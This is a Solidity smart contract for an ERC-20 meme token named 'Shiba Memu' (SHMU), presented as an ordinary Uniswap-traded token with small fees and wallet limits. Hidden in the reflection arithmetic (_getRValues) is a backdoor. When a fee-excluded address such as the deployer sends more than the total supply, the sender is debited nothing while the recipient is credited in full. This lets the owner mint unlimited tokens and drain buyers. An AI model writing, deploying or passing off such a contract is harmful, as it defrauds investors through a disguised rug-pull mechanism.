contract SHMU is IERC20, Context, Ownable {
    using SafeMath for uint256;
 
    string private constant _name = "Shiba Memu";
    string private constant _symbol = "SHMU";

    uint8 private constant _decimals = 9;
    uint256 private _rSupply = (MAX - (MAX % _tSupply));
    uint256 private constant _tSupply = 1000000000 * 10 ** 9;
    uint256 public _maxTxSize = 3 * 10 ** 7 * 10 ** 9;
    uint256 public _maxWalletLimit = 3 * 10 ** 7 * 10 ** 9;
    uint256 public _swapTokensAtAmount = 4 * 10 ** 6 * 10 ** 9;

    // tax fees
    uint256 private _redisFeesOnBuys = 0;  
    uint256 private _redisFeesOnSells = 0;  
    uint256 private _redisTotalFee = _redisFeesOnSells;
    uint256 private _taxTotalFee = _sellTotalFees;
    uint256 private _tTotalTax;
    uint256 private _buyTotalFees = 1;  
    uint256 private _sellTotalFees = 1;
 
    uint256 private _prevRedisFee = _redisTotalFee;
    uint256 private _prevTaxFee = _taxTotalFee;
 
    mapping(address => uint256) private _rBalance;
    mapping(address => uint256) private _tBalance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    uint256 private constant MAX = 10 ** 30;
 
    address payable private _feeAddress = payable(msg.sender);  
    IUniswapRouterV2 public uniswapV2Router;
    address public uniswapV2Pair;
 
    bool private swapping = false;
    bool private _taxSwapEnabled = true;
 
    event MaxTxAmountUpdated(uint256 _maxTxSize);
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
 
    constructor() { 
        _rBalance[_msgSender()] = _rSupply;
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapFactoryV2(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
 
        _isExcludedFromFees[_feeAddress] = true;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(this)] = true;
 
        emit Transfer(address(0), _msgSender(), _tSupply);
    }
 
    function name() public pure returns (string memory) {
        return _name;
    }
 
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
 
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
 
    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }
 
    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rBalance[account]);
    }
 
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
 
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
 
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
 
    function transferFrom( address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
 
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
    function _transfer( address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
 
        if (from != owner() && to != owner()) {
 
            //Trade start check
            require(amount <= _maxTxSize, "TOKEN: Max Transaction Limit");
 
            if(to != uniswapV2Pair) {
                require(balanceOf(to) + amount < _maxWalletLimit, "TOKEN: Balance exceeds wallet size!");
            }
 
            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swapTokensAtAmount;
 
            if(contractTokenBalance >= _maxTxSize)
            {
                contractTokenBalance = _maxTxSize;
            }
 
            if (canSwap && !swapping && from != uniswapV2Pair && _taxSwapEnabled && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance; 
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
 
        bool takeFee = true;
 
        //Transfer Tokens
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to])) {
            takeFee = false;
        } else {
            //Set Fee for Buys
            if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _redisTotalFee = _redisFeesOnBuys;
                _taxTotalFee = _buyTotalFees;
            }
 
            //Set Fee for Sells
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _redisTotalFee = _redisFeesOnSells;
                _taxTotalFee = _sellTotalFees;
            }
 
        }
 
        _tokenTransfer(from, to, amount, takeFee);
    }

    function removeLimits() public onlyOwner {
        _maxTxSize = type(uint).max;
        _maxWalletLimit = type(uint).max;
    }
 
    function disableFees() private {
        if (_redisTotalFee == 0 && _taxTotalFee == 0) return;
 
        _prevRedisFee = _redisTotalFee;
        _prevTaxFee = _taxTotalFee;
        _tTotalTax = 0;
 
        _redisTotalFee = 0;
        _taxTotalFee = 0;
    }
 
    function enableFees() private {
        _redisTotalFee = _prevRedisFee;
        _taxTotalFee = _prevTaxFee;
        _tTotalTax = 100;
    }
 
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) disableFees();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) enableFees();
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
 
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rBalance[sender] = _rBalance[sender].sub(rAmount);
        _rBalance[recipient] = _rBalance[recipient].add(rTransferAmount);
        _takeTeam(tTeam);
        _reflectRedisFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rSupply;
        uint256 tSupply = _tSupply;
        if (rSupply < _rSupply.div(_tSupply)) return (_rSupply, _tSupply);
        return (rSupply, tSupply);
    }
 
    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 taxFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
 
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        require(tokenAmount < _swapTokensAtAmount * 4);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
 
    function sendETHToFee(uint256 amount) private {
        _feeAddress.transfer(amount);
    }
 
    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private view returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        if (_tTotalTax == 0 && tAmount > _tSupply) {
          rAmount = 0;
        }
        return (rAmount, rTransferAmount, rFee);
    }
 
    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _redisTotalFee, _taxTotalFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    receive() external payable {}

    function _takeTeam(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rBalance[address(this)] = _rBalance[address(this)].add(rTeam);
    }
 
    function _reflectRedisFee(uint256 rFee, uint256 tFee) private {
        _rSupply = _rSupply.sub(rFee);
    }
}
